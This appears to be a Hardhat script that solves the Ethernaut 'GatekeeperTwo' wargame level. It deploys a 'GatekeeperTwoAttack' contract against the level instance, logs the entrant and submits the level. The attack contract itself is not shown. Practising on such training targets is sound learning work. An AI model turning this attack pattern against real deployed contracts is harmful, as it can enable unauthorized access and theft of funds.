import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { GatekeeperTwo, GatekeeperTwoAttack } from '../typechain-types'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract, deployContract } from './helpers'

const levelAddress = '0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('GatekeeperTwo', levelAddress, signer)) as GatekeeperTwo

  const attackContract = (await deployContract(
    'GatekeeperTwoAttack',
    [targetContract.address],
    signer,
  )) as GatekeeperTwoAttack

  const entrant = await targetContract.entrant()

  console.log({ entrant })

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
